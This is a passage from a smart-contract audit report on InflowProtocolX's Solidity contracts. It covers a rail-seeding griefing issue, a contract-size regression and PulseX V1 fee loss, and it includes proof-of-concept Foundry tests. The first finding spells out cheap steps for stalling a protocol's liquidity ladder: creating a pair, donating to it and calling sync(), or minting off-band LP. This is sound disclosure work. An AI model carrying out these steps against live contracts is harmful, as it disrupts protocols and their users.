The code is aware of the risk. The comment in `_try()` (`ExpansionModule.sol:657-676`) notes that skipping a pair the router cannot seed "would stall this rail and every rail and the treasury stage behind it for good", but the remedy it describes covers only pairs that hold dust. The ladder is a prefix chain: a rail opens only once the previous one is active and holds its POL floor (`ExpansionModule.sol:349-352`), and the treasury stage requires pHEX (`ExpansionModule.sol:377-382`).

Before rail _i_ is seeded, anyone can create and shape its IPX/rail pair:

1. Call `createPair()`, send more than 1% of the planned rail leg to the pair, and call `sync()`. From then on, `_dustWithinBound()` fails on every cycle until someone first-mints into the pair, which pays because the first minter takes the donation.
2. Alternatively, mint about $110 of LP at a ratio more than 5% off the TWAP-chain price. That is just above the $50-per-side dust bound for $5K legs. `_livePairOk()` then fails on every cycle until someone trades the pair back into band.
3. On every cycle that reaches rail _i_, `_try()` emits a skip event and returns 0. The seed stays reserved in the vault.

The README already discloses a narrower route (`README.md:387-392`). Inside their own transaction, the seller who triggers a cycle can move the route pools past their band, or buy IPX out of a live IPX/rail pair until it leaves its band, and the README says this skips the rail for one window. Applied to a seed, that skip lasts only until the next taxed sell, because expansion runs at step 4 of the cycle, before the cooldown gate (`VaultController.sol:455-456` against `VaultController.sol:529`). A seeded rail's pair is tax-flagged (`ExpansionModule.sol:779`), so on such a pair each push pays at least the 0.5% tax plus fees. That route is not what this issue reports: a shaped pair stays unseedable across cycles until someone repairs it.

## Location of Affected Code

A pair holding more than dust without LP is refused:

File: [src/ExpansionModule.sol#L996-L1008](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L996-L1008)

```solidity
function _dustWithinBound(address pair, address rail, SeedPlan memory plan, bool oneSided)
    internal
    returns (bool)
{
    uint256 bps = InflowConstants.BPS_DENOMINATOR;
    if (
        IERC20(ipxToken).balanceOf(pair) * bps <= plan.ipxLeg * DUSTED_PAIR_MAX_BPS
            && IERC20(rail).balanceOf(pair) * bps <= plan.expectedRail * DUSTED_PAIR_MAX_BPS
    ) return true;
    if (oneSided) emit PairOneSidedSkipped(rail, pair);
    else emit PairPreloadedSkipped(rail, pair);
    return false;
}
```

A live pair off its band is refused:

File: [src/ExpansionModule.sol#L975-L989](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L975-L989)

```solidity
function _livePairOk(
    address pair,
    address rail,
    address[] memory path,
    uint256 expectedRail,
    uint256 fairIpx,
    bool emitSkip
) internal returns (bool ok, uint256 pairRatioIpx) {
    pairRatioIpx = _ipxToMatchRail(expectedRail, pair);
    if (pairRatioIpx > 2 * fairIpx) {
        if (emitSkip) emit RailPriceOutOfBand(rail, pairRatioIpx, fairIpx);
        return (false, pairRatioIpx);
    }
    ok = _twapPriceOkForExistingPair(pair, rail, path, expectedRail, emitSkip);
}
```

Either refusal skips the rail with nothing moved, every cycle:

File: [src/ExpansionModule.sol#L700-L702](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L700-L702)

```solidity
(SeedPlan memory plan, bool ok) = _planSeed(token, ipxRailPair, seedUsd, anchorRefQ, true);
if (!ok) return 0;
if ((dusted || plan.dustLive) && !_dustWithinBound(ipxRailPair, token, plan, oneSided)) return 0;
```

The next rail waits on the previous one:

File: [src/ExpansionModule.sol#L349-L352](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol#L349-L352)

```solidity
for (uint256 i = 0; i < 4; ++i) {
    if (_railActive(i)) continue;
    if (B < _railPolThreshold(i)) continue;
    if (i > 0 && (!_railActive(i - 1) || !_railPolAtLeast(_rail(i - 1), InflowConstants.RAIL_LP_MIN_USD))) continue;
```

## Impact

Rail _i_, every later rail and the treasury stage are delayed, and the stage-keyed floors and thresholds stay at the lower stage. No funds are lost: every refusal returns before `withdrawTo()` (`ExpansionModule.sol:701-706`), so the seed stays in the vault, and conversion and base-pair deployment keep running. The attack is cheap: a donation of just over 1% of the rail leg (about $50, which whoever first mints into the pair can take) or about $110 parked in LP.

Recovery is permissionless but needs someone to act, and it cannot be raced. Anyone can first-mint into an over-dusted pair and capture the donation; the minter should leave more than dust in the pair, because a pair left at dust takes the direct `mint(address)` call at `ExpansionModule.sol:794`, which does not match the PulseX pair's `mint(address,address)`. For an off-band pair, one transaction can trade the pair back into band and then make a tiny taxed sell: any sell that pays sell tax runs the cycle (`IPXToken.sol:436`) and expansion runs before the cooldown gate, so the seed runs in that sell's cycle and the attacker cannot re-shape the pair in between. No such align-and-trigger helper exists in the codebase; an operator or third party would have to write one.

This is Low: the effect is a delay that anyone can end with one transaction, the attacker gains nothing and forfeits its donation or its mispricing on each repair, and the core tax, conversion and deployment cycle keeps running throughout.

## Recommendation

Give the protocol its own cure for the small pairs it cannot seed today. Every step of the cure is submitted work inside the atomic cycle, so each amount it submits must be checked before the seed leaves the vault, and a failed check must skip with nothing moved rather than revert. A revert there rolls back conversion and deployment on every cycle that reaches the rail, which would turn a stalled rail into a halted cycle.

For a pair with no LP minted that holds more than dust, size the seed legs against the pair's whole balances, so that the first mint opens at the TWAP-chain ratio and the donated tokens become protocol LP. Cap the extra reserve IPX this may pull, so that a large one-sided donation cannot draw an outsized IPX leg. The cure works only while the seed can match the donation at that ratio: a rail donation needs extra reserve IPX up to that cap, and an IPX donation larger than the planned IPX leg would need more rail than the seed buys, so keep skipping with nothing moved whenever either side's donation exceeds what the seed can match. When the donation already sits in reserves (after `sync()`), a V2 first mint credits only the tokens added on top of the reserves, so a donation that covers most of one side leaves the protocol's own addition on that side at or near zero and the mint reverts once `sqrt(amount0 * amount1)` falls below `MINIMUM_LIQUIDITY`. Preflight that arithmetic the way `LiquidityDeployer._canMintLiquidity()` does for the base legs. This curve mints through the same direct `IUniswapV2Pair(pair).mint(address(this))` call as the dust path (`ExpansionModule.sol:794`), so that call must first be changed to the PulseX pair's `mint(address,address)`. Extending `_correctDustPair()` as written would not cover the one-sided case. With one reserve at zero, its `k` is zero and it returns without swapping (`ExpansionModule.sol:1027-1043`).

For a live pair below a small size cap, swap it to the planned ratio before the add, as `_correctDustPair()` already does for dust pairs. Against a correct TWAP-chain reference, the correction buys the cheap side, so the shaper's LP pays for it; the cap bounds what the protocol pays when the reference itself is off, for example, a route TWAP held away from the market for a window. Set the cap high enough that a pair just above it is worth arbitraging back into band, otherwise, the shaper simply sizes the pair above the cap. The correction swap needs the same preflight as the mint.

Until then, document the recovery for operators: first-mint into an over-dusted pair, with more than dust and at the TWAP-chain ratio, because a pair left at dust takes the direct `mint(address)` call above; or align an off-band pair and make a small taxed sell in the same transaction.

## Team Response

Fixed.

# [L-08] Combined Audit Fixes Push VaultController 281 Bytes Over the Deployment Size Limit

## Severity

Low Risk

## Description

The combined audit fixes increase the deployed runtime of `VaultController` to **24,857 bytes**, which exceeds the **24,576-byte** EIP-170 limit by **281 bytes** under the documented deployment profile.

The original size finding affected `ExpansionModule`. That contract now fits at 23,086 bytes. The current deployment failure arises when the vault changes from the separate fix branches are built together. The latest stacked branch alone produces a 23,953-byte vault and passes its individual size check. Testing that branch in isolation misses the combined regression.

## Location of Affected Code

The launch script creates `VaultController` directly. EIP-170 applies to the runtime bytecode returned by that creation. The default Foundry profile uses solc 0.8.20 with the optimizer enabled, 200 optimizer runs and compilation through IR. [EIP-170](https://eips.ethereum.org/EIPS/eip-170)

File: [script/Deploy.s.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/3582bf7927e3a46e097f00711df97cd114cb422a/script/Deploy.s.sol)

- `run()`: `VaultController` deployment (L212)

File: [foundry.toml](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/3582bf7927e3a46e097f00711df97cd114cb422a/foundry.toml)

- `[profile.default]` deployment profile (L1-L8)

## Impact

Contract creation fails at the vault deployment step on a chain enforcing EIP-170, preventing the protocol from launching with the measured build. Increasing the transaction gas limit cannot overcome the bytecode limit. Low severity reflects a pre-launch deployment failure with no direct loss of user funds.

## Proof of Concept

On November 20, 2026, all 32 open fix branches (94 through 125) were combined locally, including the separate vault changes for deferred liquidity deployment, migration checks and valuation status. The integrated source tree had Git object ID `ecc0259c62245d877180681adf752918e326a765` (`git rev-parse HEAD:src`). The exact byte count depends on the final merge resolutions.

| Build                                  | Vault runtime | Margin against EIP-170 |
| -------------------------------------- | ------------: | ---------------------: |
| Stacked branch alone, commit `3582bf7` |  23,953 bytes |        623 bytes under |
| Local integration of all 32 branches   |  24,857 bytes |     **281 bytes over** |

From the integrated checkout, build the production artefacts and run the repository’s size suite with the deployment profile. The suite measures deployed runtime bytecode. [Size test](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/3582bf7927e3a46e097f00711df97cd114cb422a/test/size/ContractSizeLimit.t.sol#L18-L29)

```sh
FOUNDRY_PROFILE=default forge build src/
FOUNDRY_PROFILE=default FOUNDRY_TEST=test/size forge test --match-path test/size/ContractSizeLimit.t.sol -vv
```

Observed output, abridged:

```text
[PASS] test_ExpansionModule_withinEip170()
  ExpansionModule.sol:ExpansionModule: 23086

[FAIL: VaultController.sol:VaultController: 24857 > 24576] test_VaultController_withinEip170()
  VaultController.sol:VaultController: 24857

9 passed, 1 failed, 0 skipped
```

## Recommendation

Reduce the vault runtime by at least 281 bytes on this integration and leave headroom for subsequent changes. Run the existing size suite on the exact release commit under the deployment profile, and require every deployment contract to pass before broadcast.

## Team Response

Fixed.

# [L-09] Protocol-Owned Liquidity Earns No Swap Fees on PulseX V1

## Severity

Low Risk

No funds are lost and the tax is untouched. The effect is certain and cannot be changed after deployment, and it works against an assumption the code makes in three places. The measured effect on the team's own simulation is delay, not early opening. At volumes near the simulation's top scenario, the forgone growth is large next to the stage thresholds, so the grade depends on the volume the team expects (see Impact).

## Description

IPX's own pairs are created on PulseX V1. `InflowAddresses` points the router and factory there, and PR #101 confirms the choice: "IPX's own pairs and the WPLS/USDC anchor are on PULSEX_FACTORY (V1)". The README, the brief and the deliverable describe the venue as "PulseX V2" (`README.md:350`, `AUDIT_BRIEF.md:41`, `M3_DELIVERABLE.md:41,153,226`), while the constant is the V1 factory.

On V1, liquidity providers get none of the 0.29% swap fee. The pair's `_mintFee()` has an integer division that evaluates to zero:

```solidity
// PulseX V1 pair
uint denominator = rootK.mul(uint(4998) / uint(10000)).add(rootKLast);
```

`4998 / 10000` is 0, so the denominator is just `rootKLast` and `feeTo` is minted LP for all of the pool's fee growth. V2 fixed this line, and their LPs keep 22/29 of the fee, about 0.22% of every swap:

```solidity
// PulseX V2 pair
uint denominator = (rootK.mul(22) / 7).add(rootKLast);
```

`feeTo` is set on both factories. The V1 mint does not take money out of the pool. It prints new LP tokens to `feeTo`, which shrinks the share of every existing LP, IPX's included. The V1 `feeTo` is a contract and the factory's `feeToSetter` can change it, so the effect lasts as long as PulseX leaves it as it is.

The code assumes the opposite, in three places:

- `polUsd()`: "Genuine LP growth and accrued LP fees raise r0 \* r1 and still count."
- `PolUsdValuation.t.sol`, section "Genuine LP growth still counts".
- `test_32_polUsd_risesOnLpFeeAccrual()` asserts that accrued LP fees increase POL. It runs on `MockUniswapV2Pair`, which has no `feeTo`, and stops right after the accrual.

This has three effects.

**1. The locked LP earns nothing from fees.** All LP in the IPX pairs is locked for 5,555 days. On V1, it keeps none of the fee growth its own liquidity produces.

**2. B grows more slowly than the simulation shows.** The simulation runs on a mock pair that keeps the fees. Fee growth is part of the growth in `polUsd()`, and on V1 it is minted away at the next liquidity add.

**3. B reads high until the next liquidity add.** Fee growth sits in the reserves, so `polUsd()` counts it (`lpBal * 2 * sqrt(v0 * v1) / totalSupply`), while `totalSupply` has not yet grown by the LP that V1 will mint to `feeTo`. `_mintFee()` runs only when liquidity is added or removed on the pair. `_runCycle()` reads B before the deploy step, and `checkExpansion()` opens a rail when `B >= threshold`. Rails are one-way flags, and a taxed sell after the cooldown, the keeper or the owner can trigger the cycle.

## Location of Affected Code

File: [src/InflowConstants.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/InflowConstants.sol)

- `PULSEX_ROUTER` and `PULSEX_FACTORY` (L336-L337)

File: [src/VaultController.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol)

- `polUsd()` (L1298-L1341) and its comment (L1329-L1330)
- `_calculateB()` (L1251-L1263)
- `poke()` (L403-L407)

File: [src/ExpansionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol)

- `checkExpansion()` (L331-L386): rail gating (L331-L352)

File: [test/unit/PolUsdValuation.t.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/test/unit/PolUsdValuation.t.sol)

- "Genuine LP growth still counts" section (L350)
- `test_32_polUsd_risesOnLpFeeAccrual()` (L383-L408)

File: [test/mocks/MockUniswapV2Pair.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/test/mocks/MockUniswapV2Pair.sol)

- no fee mint

File: [test/simulation/LowVolumeLadder.t.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/test/simulation/LowVolumeLadder.t.sol)

File: [README.md](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/README.md)

- "PulseX V2" (L388)

File: [AUDIT_BRIEF.md](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/AUDIT_BRIEF.md)

- "PulseX V2 on mainnet" (L45)

File: [M3_DELIVERABLE.md](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/M3_DELIVERABLE.md)

- "PulseX V2" (L43, L155, L228)

## Impact

The tax is unaffected: IPX keeps its full 0.5% on every buy and sell. What changes is the growth of the locked POL and what the stage logic believes about it.

**Rails open later (measured).** I ran the team's own ladder simulation twice, once with its mock pairs and once with a V1 pair and nothing else changed:

| Sim scenario       | PRVX opens, team's pairs | PRVX opens, V1 pair    |
| ------------------ | ------------------------ | ---------------------- |
| $30K per day label | day 49                   | day 63 (14 days later) |
| $10K per day label | day 148                  | not open by day 166    |

**Forgone growth (measured on real pairs).** On V2, the locked LP keeps about 21.9 bps of the swap volume, on V1, it keeps 0. At the simulation's three volumes, if IPX owns the whole pool:

| Sim scenario | Swap volume per day | Forgone per day | Per year    |
| ------------ | ------------------- | --------------- | ----------- |
| $10K label   | $21,149             | about $46       | about $17K  |
| $30K label   | $61,183             | about $134      | about $49K  |
| $100K label  | $200,482            | about $440      | about $160K |

The labels count a buy and sell round trip once, so the real swap volume is about twice the label. The growth would stay inside the locked LP and raise B, not arrive as cash. At half the pool, the figures halve. Against stage thresholds of $50K to $150K, a year at the top scenario is more than the first threshold, and at the bottom scenario it is small. The grade depends on the volume the team expects.

**B overstated before the next liquidity add (measured).** On the real vault, with pools sized for B of about $50K and B placed just under the PRVX step, one day of the simulation's volume reads B as $50,550 and as $49,999 after the V1 mint. `checkExpansion()` and `poke()` open PRVX and withdraw the $5,000 seed in that window and open nothing after the mint. How long the window lasts depends on how often the vault adds liquidity. In the $100K scenario, it adds once in 480 cycles, B reads 2,101 bps high at day 10 and about 86% of the growth the simulation reports is fee growth V1 mints away. In the $10K and $30K scenarios, it adds every few cycles, B reads at most 4 bps high, and no early opening appears in the natural runs. The harm shown is therefore timing: the seed becomes locked IPX/PRVX LP and is not lost, the flag is one-way, and the stage raises the floors and thresholds. A wash trader pays about $2.74 for each $1 of overstatement.

The choice is permanent. The brief says the contracts cannot be patched after launch and the LP is locked for 5,555 days.

## Proof of Concept

The tests are included below, collapsed. Fork tests are pinned to PulseChain block 28,091,000. `--skip ExpansionFlows` is only needed on forge 1.7.1, where `ExpansionFlows.t.sol:355` does not compile (a `view` helper calls `vm.getRecordedLogs()`).

- `PulseXV1Differential.fork.t.sol`: the same seven phases (mint, 400 swaps, third-party add, uneven swaps, off-ratio add, half burn, full exit) on a real V1 pair and on a V1 pair built from the team's mock, with total supply, every LP balance, both reserves and `kLast` asserted equal after each phase.
- `PolUsdPreMintWindow.fork.t.sol`: on real V1 and V2 pairs, the polUsd-style value is overstated before the pair's fee mint by the pool's sqrt(k) growth (28,295 ppm after 400 trades on V1, 6,686 ppm on V2, which is 7/29 of it).
- `FeeIncomeMeasured.fork.t.sol`: the LP income on real V1 and V2 pairs (V1: 0, V2: 21.94 bps of swap volume).
- `PolUsdPreMintVaultV1.t.sol`: the real `VaultController` and `ExpansionModule` through `InflowFixture` with the V1 pair. It covers the rail opening inside the window and not after the mint, `test_32` carried through the next liquidity add (`polUsd()` 102,400 before, 107,964 after 10 days of swaps, 102,400 after the next add), the team's simulation at three volumes, the time to PRVX, and the wash-trade cost.

```
PULSECHAIN_RPC_URL=<rpc> forge test --skip ExpansionFlows --match-path "test/audit/issues/*.fork.t.sol" -vv
forge test --skip ExpansionFlows --match-path "test/audit/issues/PolUsdPreMintVaultV1.t.sol" -vv
```

Limits: the vault tests run on a V1 pair proven identical to the real one in the scripted sequence above, not on a real V1 pair inside the vault. The oracle, the route pools and the router are the team's mocks. The simulation's depth and volume are the team's (a pool of about $20K turning over about ten times a day), and in the $100K scenario the vault's conversions stall after the first cycle, which I did not investigate. The B overstatement is shown in a placed boundary case. The treasury path, rail seed pricing under manipulation and an attacker's profit were not tested.

Copy the five files into `test/audit/issues/` of the audited repo.

`test/audit/issues/V1FaithfulPair.sol`: V1 pair built from the team's mock, with the real V1 \_mintFee

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {InflowConstants} from "../../../src/InflowConstants.sol";

interface IUniswapV2CalleeV1 {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

/// @notice AUDIT TEST CODE. Copy of test/mocks/MockUniswapV2Pair.sol with PulseX V1's protocol fee added.
///
///         Storage layout: every variable of the mock is declared in the same order, and the new variables are
///         appended at the end, so `vm.etch(pair, type(PulseXV1FaithfulPair).runtimeCode)` swaps the code of a
///         pair the fixture already created and keeps its storage.
///
///         The only behavioural change: `mint` and `burn` run `_mintFee()` first and set `kLast` last, exactly
///         as the PulseX V1 pair does, including its integer division `uint(4998) / uint(10000)` that evaluates
///         to 0 (so `feeTo` is minted LP for ALL of the sqrt(k) growth). PulseXV1Differential.fork.t.sol proves
///         the faithfulness against the real V1 pair on a pinned fork.
///
///         Test-only additions: `enableFeeOn`, `resyncKLast` and cumulative swap counters (volume measurement).
contract PulseXV1FaithfulPair is ERC20 {
    // ---- storage identical to MockUniswapV2Pair, same order ----
    address public token0;
    address public token1;
    uint112 private reserve0;
    uint112 private reserve1;
    uint32  private blockTimestampLast;
    address public factory;

    uint256 public price0CumulativeLast;
    uint256 public price1CumulativeLast;
    uint256 private constant Q112 = 2**112;

    uint256 public constant MINIMUM_LIQUIDITY = 1000;

    uint256 private unlocked = 1;

    // ---- appended (new) storage ----
    address public feeTo;
    uint256 public kLast;
    uint256 public cumIn0;
    uint256 public cumIn1;
    uint256 public cumOut0;
    uint256 public cumOut1;
    uint256 public swapCount;

    modifier lock() {
        require(unlocked == 1, "LOCKED");
        unlocked = 0;
        _;
        unlocked = 1;
    }

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
    event Swap(address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);
    event Sync(uint112 reserve0, uint112 reserve1);

    constructor() ERC20("Mock LP", "MLP") {
        factory = msg.sender;
    }

    function initialize(address _token0, address _token1) external {
        require(msg.sender == factory, "FORBIDDEN");
        require(token0 == address(0), "ALREADY");
        token0 = _token0;
        token1 = _token1;
    }

    // ---- test-only controls ----

    /// Turn the protocol fee on, as the factory's feeTo does on PulseX, and start tracking from the current
    /// reserves (equivalent to a fee-on pair whose last liquidity event is "now").
    function enableFeeOn(address feeTo_) external {
        feeTo = feeTo_;
        kLast = uint256(reserve0) * uint256(reserve1);
    }

    /// Restart the fee window at the current reserves (test scaffolding that placed the reserves by hand).
    function resyncKLast() external {
        kLast = uint256(reserve0) * uint256(reserve1);
    }

    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, blockTimestampLast);
    }

    function _update(uint256 balance0, uint256 balance1) private {
        require(balance0 <= type(uint112).max && balance1 <= type(uint112).max, "OVERFLOW");
        uint32 blockTimestamp = uint32(block.timestamp);
        unchecked {
            uint32 timeElapsed = blockTimestamp - blockTimestampLast;
            if (timeElapsed > 0 && reserve0 != 0 && reserve1 != 0) {
                price0CumulativeLast += (uint256(reserve1) * Q112 / uint256(reserve0)) * timeElapsed;
                price1CumulativeLast += (uint256(reserve0) * Q112 / uint256(reserve1)) * timeElapsed;
            }
        }
        reserve0 = uint112(balance0);
        reserve1 = uint112(balance1);
        blockTimestampLast = blockTimestamp;
        emit Sync(reserve0, reserve1);
    }

    /// Verbatim PulseX V1 `_mintFee` (UniswapV2Pair with the 4998 / 10000 constant).
    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {
        address feeTo_ = feeTo;
        feeOn = feeTo_ != address(0);
        uint256 _kLast = kLast;
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = _sqrt(uint256(_reserve0) * uint256(_reserve1));
                uint256 rootKLast = _sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator = totalSupply() * (rootK - rootKLast);
                    uint256 denominator = rootK * (uint256(4998) / uint256(10000)) + rootKLast;
                    uint256 liquidity = numerator / denominator;
                    if (liquidity > 0) _mint(feeTo_, liquidity);
                }
            }
        } else if (_kLast != 0) {
            kLast = 0;
        }
    }

    function mint(address to) external lock returns (uint256 liquidity) {
        (uint256 _r0, uint256 _r1) = (reserve0, reserve1);
        uint256 balance0 = IERC20(token0).balanceOf(address(this));
        uint256 balance1 = IERC20(token1).balanceOf(address(this));
        uint256 amount0 = balance0 - _r0;
        uint256 amount1 = balance1 - _r1;

        bool feeOn = _mintFee(uint112(_r0), uint112(_r1));
        uint256 _totalSupply = totalSupply();
        if (_totalSupply == 0) {
            liquidity = _sqrt(amount0 * amount1) - MINIMUM_LIQUIDITY;
            _mint(address(0xdead), MINIMUM_LIQUIDITY);
        } else {
            uint256 q0 = (amount0 * _totalSupply) / _r0;
            uint256 q1 = (amount1 * _totalSupply) / _r1;
            liquidity = q0 < q1 ? q0 : q1;
        }
        require(liquidity > 0, "INSUFFICIENT_LIQUIDITY_MINTED");
        _mint(to, liquidity);
        _update(balance0, balance1);
        if (feeOn) kLast = uint256(reserve0) * uint256(reserve1);
        emit Mint(msg.sender, amount0, amount1);
    }

    function burn(address to) external lock returns (uint256 amount0, uint256 amount1) {
        (uint256 _r0, uint256 _r1) = (reserve0, reserve1);
        uint256 balance0 = IERC20(token0).balanceOf(address(this));
        uint256 balance1 = IERC20(token1).balanceOf(address(this));
        uint256 liquidity = balanceOf(address(this));

        bool feeOn = _mintFee(uint112(_r0), uint112(_r1));
        uint256 _totalSupply = totalSupply();
        amount0 = (liquidity * balance0) / _totalSupply;
        amount1 = (liquidity * balance1) / _totalSupply;
        require(amount0 > 0 && amount1 > 0, "INSUFFICIENT_LIQUIDITY_BURNED");
        _burn(address(this), liquidity);
        _safeTransfer(token0, to, amount0);
        _safeTransfer(token1, to, amount1);
        balance0 = IERC20(token0).balanceOf(address(this));
        balance1 = IERC20(token1).balanceOf(address(this));
        _update(balance0, balance1);
        if (feeOn) kLast = uint256(reserve0) * uint256(reserve1);
        emit Burn(msg.sender, amount0, amount1, to);
    }

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
        require(amount0Out > 0 || amount1Out > 0, "INSUFFICIENT_OUTPUT_AMOUNT");
        (uint256 _r0, uint256 _r1) = (reserve0, reserve1);
        require(amount0Out < _r0 && amount1Out < _r1, "INSUFFICIENT_LIQUIDITY");

        if (amount0Out > 0) _safeTransfer(token0, to, amount0Out);
        if (amount1Out > 0) _safeTransfer(token1, to, amount1Out);
        if (data.length > 0) IUniswapV2CalleeV1(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);

        uint256 balance0 = IERC20(token0).balanceOf(address(this));
        uint256 balance1 = IERC20(token1).balanceOf(address(this));
        uint256 amount0In = balance0 > _r0 - amount0Out ? balance0 - (_r0 - amount0Out) : 0;
        uint256 amount1In = balance1 > _r1 - amount1Out ? balance1 - (_r1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, "INSUFFICIENT_INPUT_AMOUNT");

        uint256 balance0Adjusted = balance0 * InflowConstants.AMM_FEE_DEN
            - amount0In * (InflowConstants.AMM_FEE_DEN - InflowConstants.AMM_FEE_NUM);
        uint256 balance1Adjusted = balance1 * InflowConstants.AMM_FEE_DEN
            - amount1In * (InflowConstants.AMM_FEE_DEN - InflowConstants.AMM_FEE_NUM);
        require(
            balance0Adjusted * balance1Adjusted
                >= _r0 * _r1 * InflowConstants.AMM_FEE_DEN * InflowConstants.AMM_FEE_DEN,
            "K"
        );

        cumIn0 += amount0In;
        cumIn1 += amount1In;
        cumOut0 += amount0Out;
        cumOut1 += amount1Out;
        swapCount += 1;

        _update(balance0, balance1);
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
    }

    function sync() external lock {
        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)));
    }

    function _safeTransfer(address token, address to, uint256 value) private {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }

    /// UniswapV2Math.sqrt (Babylonian), the function the real pair uses.
    function _sqrt(uint256 y) private pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}
```

`test/audit/issues/PulseXV1Differential.fork.t.sol`: that pair equals the real V1 pair bit for bit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {PulseXV1FaithfulPair} from "./V1FaithfulPair.sol";

interface IFactoryD {
    function createPair(address a, address b) external returns (address);
    function feeTo() external view returns (address);
}

interface IPairD {
    function mint(address to, address senderOrigin) external returns (uint256); // PulseX signature
    function burn(address to, address senderOrigin) external returns (uint256, uint256);
    function swap(uint256 out0, uint256 out1, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function kLast() external view returns (uint256);
}

contract TokenD {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// DIFFERENTIAL TEST. Proves that `PulseXV1FaithfulPair` (the mock pair with PulseX V1's protocol fee, used by
/// PolUsdPreMintVaultV1.t.sol) behaves exactly like the REAL PulseX V1 pair: the same scripted operations are run
/// on a real V1 pair created through the real V1 factory on a pinned mainnet fork, and on the faithful mock.
/// After every phase total supply, the LP's, a third party's and feeTo's LP balances, the reserves, kLast and the
/// amounts paid out by burn must be bit-identical.
///
///   PULSECHAIN_RPC_URL=https://rpc.pulsechain.com forge test --skip ExpansionFlows \
///     --match-path test/audit/issues/PulseXV1Differential.fork.t.sol -vv
contract PulseXV1Differential is Test {
    address constant V1_FACTORY = 0x1715a3E4A142d8b698131108995174F37aEBA10D; // InflowAddresses.PULSEX_FACTORY
    uint256 constant FORK_BLOCK = 28_091_000;

    struct Side {
        address pair;
        TokenD a;
        TokenD b;
        bool real;
    }

    address lp = makeAddr("protocolLp");
    address third = makeAddr("thirdPartyLp");
    address trader = makeAddr("trader");
    address feeTo;

    function setUp() public {
        vm.createSelectFork(vm.envString("PULSECHAIN_RPC_URL"), FORK_BLOCK);
        feeTo = IFactoryD(V1_FACTORY).feeTo();
        require(feeTo != address(0), "V1 protocol fee is off on this fork");
    }

    function test_faithfulPairMatchesRealV1() public {
        Side memory r = _newReal();
        Side memory f = _newFaithful();

        // Phase 1: the protocol is the first LP.
        uint256 liqR = _mint(r, lp, 1_000_000e18, 1_000_000e18);
        uint256 liqF = _mint(f, lp, 1_000_000e18, 1_000_000e18);
        assertEq(liqR, liqF, "phase 1 liquidity");
        _same(r, f, "1 first mint");

        // Phase 2: 400 swaps back and forth.
        for (uint256 i; i < 400; i++) {
            _swap(r, i % 2 == 0, 50_000e18);
            _swap(f, i % 2 == 0, 50_000e18);
        }
        _same(r, f, "2 after 400 swaps");

        // Phase 3: a third party adds 1% proportionally: _mintFee fires.
        liqR = _mint(r, third, 10_000e18, 10_000e18);
        liqF = _mint(f, third, 10_000e18, 10_000e18);
        assertEq(liqR, liqF, "phase 3 liquidity");
        _same(r, f, "3 third-party add (fee mint)");

        // Phase 4: 100 uneven swaps.
